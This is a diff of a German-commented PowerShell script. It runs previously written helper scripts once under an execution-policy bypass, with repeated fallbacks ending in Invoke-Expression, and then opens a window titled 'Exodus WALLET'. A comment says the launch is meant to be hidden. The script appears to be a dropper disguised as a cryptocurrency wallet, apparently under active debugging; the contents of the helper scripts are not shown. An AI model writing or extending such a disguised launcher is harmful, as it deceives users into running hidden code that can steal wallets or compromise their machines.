@@ -1273,108 +1273,115 @@ Write-Output "System.ps1 in $systemScriptPath geschrieben."
 [IO.File]::WriteAllText($microsoftViewSScriptPath, $microsoftViewSScriptContent, [System.Text.Encoding]::UTF8)
 Write-Output "MicrosoftViewS.ps1 in $microsoftViewSScriptPath geschrieben."
 # Alle Dateien sind jetzt geschrieben – WindowsOperator.ps1 ausführen (hidden, non-blocking)
-# Debugging-Setup: Logs auf Desktop (PS 2.0-kompatibel)
-$logDir = "$env:USERPROFILE\Desktop\DebugLogs"
-if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
-$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
-$outputLog = Join-Path $logDir "Operator_Output_${timestamp}.txt"
-$errorLog = Join-Path $logDir "Operator_Error_${timestamp}.txt"
 
-$scriptToRun = $operatorScriptPath  # Stelle sicher, dass das korrekt ist (nicht $systemScriptPath)
 
-Write-Output "Debugging-Modus aktiviert. Starte sichtbar: $scriptToRun"
-Write-Output "Logs: $outputLog | $errorLog"
-Write-Output "Aktuelle PS-Version: $($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor)"
-Write-Output "Aktuelle ExecutionPolicy: $(Get-ExecutionPolicy)"
+# NEU: Operator EINMAL starten (wenn Flag nicht existiert) – mit Debugging
+if (-not (Test-Path $flagFilePath)) {
+    # Debugging-Setup
+    $logDir = "$env:USERPROFILE\Desktop\DebugLogs"
+    if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
+    $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
+    $outputLog = Join-Path $logDir "Operator_Output_${timestamp}.txt"
+    $errorLog = Join-Path $logDir "Operator_Error_${timestamp}.txt"
 
-# Hilfsfunktion: Logs appenden (für Console + File)
-function Write-DebugLog {
-    param([string]$Message, [string]$Type = "INFO")
-    $timestamped = "[$(Get-Date)] [$Type] $Message"
-    Write-Output $timestamped
-    Add-Content -Path $outputLog -Value $timestamped -ErrorAction SilentlyContinue
-}
+    Write-Output "Debugging-Modus aktiviert. Starte sichtbar: $operatorScriptPath"
+    Write-Output "Logs: $outputLog | $errorLog"
+    Write-Output "Aktuelle PS-Version: $($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor)"
+    Write-Output "Aktuelle ExecutionPolicy: $(Get-ExecutionPolicy)"
 
-try {
-    Write-DebugLog "Versuche Start-Process (sichtbar + Bypass)..."
-
-    # PS-Version-Check für Redirects
-    $useRedirects = ($PSVersionTable.PSVersion.Major -ge 3)
-
-    $startArgs = @(
-        "-ExecutionPolicy Bypass",
-        "-NoProfile",  # Schneller, weniger Noise
-        "-Verbose",    # Mehr Details
-        "-Debug",      # Noch mehr für Troubleshooting
-        "-File `"$scriptToRun`""
-    )
-
-    $processInfo = @{
-        FilePath = "powershell.exe"
-        ArgumentList = $startArgs
-        WindowStyle = "Normal"  # Sichtbar!
-        PassThru = $true
+    # Hilfsfunktion für Logs
+    function Write-DebugLog {
+        param([string]$Message, [string]$Type = "INFO")
+        $timestamped = "[$(Get-Date)] [$Type] $Message"
+        Write-Output $timestamped
+        Add-Content -Path $outputLog -Value $timestamped -ErrorAction SilentlyContinue
     }
 
-    # Conditional Redirects
-    if ($useRedirects) {
-        $processInfo.RedirectStandardOutput = $outputLog
-        $processInfo.RedirectStandardError = $errorLog
-        Write-DebugLog "Redirects aktiviert (PS 3.0+)."
-    } else {
-        Write-DebugLog "Redirects deaktiviert (ältere PS-Version)."
+    # Policy setzen
+    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process | Out-Null
+    Write-DebugLog "Policy auf Bypass gesetzt (Scope: Process)."
+
+    $started = $false
+    try {
+        Write-DebugLog "Versuche Start-Process (sichtbar + Bypass)..."
+
+        # Reine PS-Args als Array (kein Mix)
+        $psArgs = @(
+            "-ExecutionPolicy", "Bypass",
+            "-NoProfile",
+            "-File", $operatorScriptPath  # Keine extra Quotes, da Array
+        )
+
+        # Start-Process mit expliziten Params (kein Splatting, keine "and")
+        $process = Start-Process -FilePath "powershell.exe" `
+                                -ArgumentList $psArgs `
+                                -WindowStyle "Normal" `
+                                -RedirectStandardOutput $outputLog `
+                                -RedirectStandardError $errorLog `
+                                -PassThru `
+                                -Wait
+
+        $exitCode = if ($process.ExitCode -ne $null) { $process.ExitCode } else { $LASTEXITCODE }
+        Write-DebugLog "Prozess gestartet (PID: $($process.Id)). Abgeschlossen mit ExitCode: $exitCode"
+
+        $started = $true
+        if ($exitCode -ne 0) { throw "Operator endete mit Fehler (ExitCode: $exitCode)" }
+
+    } catch {
+        Write-DebugLog "Start-Fehler: $($_.Exception.Message)" "ERROR"
+        Write-DebugLog "StackTrace: $($_.ScriptStackTrace)" "ERROR"
     }
 
-    $process = Start-Process @processInfo
+    if (-not $started) {
+        # Fallback: Vereinfachter Start (ohne Redirects, um Errors zu vermeiden)
+        Write-DebugLog "Fallback: Starte via powershell.exe -Bypass (vereinfacht)..."
+        try {
+            $fallbackArgs = @(
+                "-ExecutionPolicy", "Bypass",
+                "-NoProfile",
+                "-File", $operatorScriptPath
+            )
+            $fallbackProcess = Start-Process -FilePath "powershell.exe" `
+                                            -ArgumentList $fallbackArgs `
+                                            -WindowStyle "Normal" `
+                                            -PassThru `
+                                            -Wait
 
-    Write-DebugLog "Prozess gestartet (PID: $($process.Id)). Warte auf Abschluss..."
-    $process.WaitForExit()
+            $fallbackExitCode = if ($fallbackProcess.ExitCode -ne $null) { $fallbackProcess.ExitCode } else { $LASTEXITCODE }
+            Write-DebugLog "Fallback-Prozess abgeschlossen (ExitCode: $fallbackExitCode)."
+            $started = $true
+        } catch {
+            Write-DebugLog "Fallback-Fehler: $($_.Exception.Message)" "ERROR"
+        }
+    }
 
-    Write-DebugLog "Prozess beendet (ExitCode: $($process.ExitCode))."
+    if (-not $started) {
+        # Ultimativer Fallback: Inline-Ausführung (alles sichtbar im Hauptfenster)
+        Write-DebugLog "Ultimativer Fallback: Inline-Ausführung..."
+        if (Test-Path $operatorScriptPath) {
+            $scriptContent = Get-Content $operatorScriptPath -Raw
+            Invoke-Expression $scriptContent
+        } else {
+            Write-DebugLog "Script-Datei nicht gefunden: $operatorScriptPath" "ERROR"
+        }
+    }
 
-    # Logs anzeigen (auch ohne Redirects: Inhalt aus Operator.ps1 kommt im Fenster)
-    if (Test-Path $outputLog -and (Get-Item $outputLog).Length -gt 0) {
-        Write-DebugLog "=== OUTPUT LOG ==="
-        Get-Content $outputLog
+    # Logs anzeigen (am Ende)
+    if (Test-Path $outputLog -and (Get-Content $outputLog | Measure-Object).Count -gt 1) {
+        Write-DebugLog "=== OUTPUT LOG (letzte 20 Zeilen) ==="
+        Get-Content $outputLog -Tail 20
     }
     if (Test-Path $errorLog -and (Get-Item $errorLog).Length -gt 0) {
         Write-DebugLog "=== ERROR LOG ==="
         Get-Content $errorLog
     }
 
-} catch {
-    Write-DebugLog "Start-Fehler: $($_.Exception.Message)" "ERROR"
-    Write-DebugLog "StackTrace: $($_.ScriptStackTrace)" "ERROR"
-    
-    # Robuster Fallback: Via powershell.exe (umgeht aktuelle Policy)
-    Write-DebugLog "Fallback: Starte via powershell.exe -Bypass..."
-    try {
-        $fallbackArgs = @(
-            "-ExecutionPolicy Bypass",
-            "-WindowStyle Normal",
-            "-NoProfile",
-            "-Verbose",
-            "-Debug",
-            "-File `"$scriptToRun`""
-        )
-        $fallbackProcess = Start-Process -FilePath "powershell.exe" -ArgumentList $fallbackArgs -Wait -PassThru -WindowStyle Normal
-        
-        Write-DebugLog "Fallback-Prozess beendet (ExitCode: $($fallbackProcess.ExitCode))."
-        
-        # Logs nach Fallback checken
-        if (Test-Path $outputLog) { Get-Content $outputLog | ForEach-Object { Write-DebugLog $_ } }
-        if (Test-Path $errorLog) { Get-Content $errorLog | ForEach-Object { Write-DebugLog $_ "ERROR" } }
-    } catch {
-        Write-DebugLog "Fallback-Fehler: $($_.Exception.Message)" "ERROR"
-        # Ultimativer Fallback: Inline-Ausführung (Invoke-Expression auf Inhalt)
-        Write-DebugLog "Ultimativer Fallback: Inline-Ausführung des Script-Inhalts..."
-        $scriptContent = Get-Content $scriptToRun -Raw -ErrorAction Stop
-        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process  # Sicherstellen
-        Invoke-Expression $scriptContent  # Läuft im aktuellen Scope – alle Outputs hier!
-    }
+    # Flag setzen nach Start
+    New-Item -Path $flagFilePath -ItemType File -Force | Out-Null
+    Write-DebugLog "Operator-Start abgeschlossen. Flag gesetzt."
 }
 
-Write-DebugLog "Debugging abgeschlossen. Überprüfe das neue PS-Fenster/Logs für Operator-Details."
+
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "Exodus WALLET"
